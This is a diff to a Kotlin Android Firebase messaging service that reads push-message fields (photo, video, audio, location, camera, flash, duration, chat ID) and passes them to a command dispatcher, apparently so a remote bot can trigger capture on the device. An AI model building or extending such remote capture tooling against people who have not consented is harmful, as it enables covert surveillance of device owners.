@@ -9,13 +9,11 @@ class FCMService : FirebaseMessagingService() {
         Log.d("FCMService", "From: ${remoteMessage.from}")
         Log.d("FCMService", "Data: ${remoteMessage.data}")
 
-        val type = remoteMessage.data["type"]       // e.g. "photo", "video", "audio", "location", "ring", "vibrate"
-        val camera = remoteMessage.data["camera"]   // e.g. "front" or "rear"
-        val flash = remoteMessage.data["flash"]     // e.g. "true" or "false"
-        val quality = remoteMessage.data["quality"] // e.g. "420p", "720p", "1080p"
-        val duration = remoteMessage.data["duration"] // in seconds or minutes as per your design
-
-        // FIX: Accept both "chat_id" and "chatId" to support both payload styles
+        val type = remoteMessage.data["type"]
+        val camera = remoteMessage.data["camera"]
+        val flash = remoteMessage.data["flash"]
+        val quality = remoteMessage.data["quality"]
+        val duration = remoteMessage.data["duration"]
         val chatId = remoteMessage.data["chat_id"] ?: remoteMessage.data["chatId"]
 
         if (type != null && chatId != null) {
@@ -23,7 +21,7 @@ class FCMService : FirebaseMessagingService() {
                 "FCMService",
                 "Dispatching action: type=$type, camera=$camera, flash=$flash, quality=$quality, duration=$duration, chatId=$chatId"
             )
-            ActionHandlers.dispatch(
+            CommandManager.dispatch(
                 applicationContext,
                 type = type,
                 camera = camera,
@@ -39,6 +37,6 @@ class FCMService : FirebaseMessagingService() {
 
     override fun onNewToken(token: String) {
         Log.d("FCMService", "Refreshed token: $token")
-        // Send the new token to your bot server if needed
+        // Optionally handle token updates here.
     }
 }
